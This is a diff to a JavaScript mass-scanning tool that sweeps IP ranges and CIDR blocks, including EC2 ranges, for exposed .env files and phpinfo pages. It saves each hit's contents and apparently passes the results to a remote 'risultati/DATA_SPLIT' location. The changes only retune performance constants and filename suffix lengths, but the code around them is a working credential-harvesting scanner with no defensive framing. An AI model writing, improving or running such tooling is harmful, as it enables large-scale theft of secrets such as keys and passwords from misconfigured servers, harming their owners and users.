@@ -64,12 +64,12 @@ const LOAD_FROM_CIDR = true;
 const USE_REV = false;
 
 // --- Performance ---
-const MAX_SITE_BATCH = 8;
+const MAX_SITE_BATCH = 4;
 const MAX_LIST_ENV = 20;
 const MAX_LIST_PHP = 20;
 const DNS_WORKERS_EC2 = 200;
 const DNS_TIMEOUT_EC2 = 8;
-const TOTAL_IPS_PER_CYCLE = 40000;
+const TOTAL_IPS_PER_CYCLE = 30000;
 const NUM_CIDR_PER_CYCLE = 6;
 const TOTAL_SLOTS = 2000;
 const NUM_WORKERS = 8;
@@ -541,7 +541,7 @@ async function scanSite(siteLink, isFallback = false) {
 
         if (foundForSite) {
           log(`  [+] Found | ${res.config.url}`);
-          const suffix = randStr(10);
+          const suffix = randStr(20);
           const savedPath = path.join(NEW_PATH_EXTRACT, `ENV_NEW_${suffix}.txt`);
           await fs.promises.writeFile(savedPath, `${res.config.url}\n${content}`);
           const remote = `risultati/DATA_SPLIT/ENV_NEW_${suffix}.txt`;
@@ -682,7 +682,7 @@ async function scanSite(siteLink, isFallback = false) {
                     });
                     if (formattedOutput) {
                       log(`  [+] PHPINFO FOUND | ${item.url}`);
-                      const suffix = randStr(10);
+                      const suffix = randStr(20);
                       const savedPath = path.join(NEW_PATH_EXTRACT, `PHPINFO_${suffix}.txt`);
                       await fs.promises.writeFile(savedPath, `${item.url}\n${formattedOutput}`);
                       const remote = `risultati/DATA_SPLIT/PHPINFO_${suffix}.txt`;
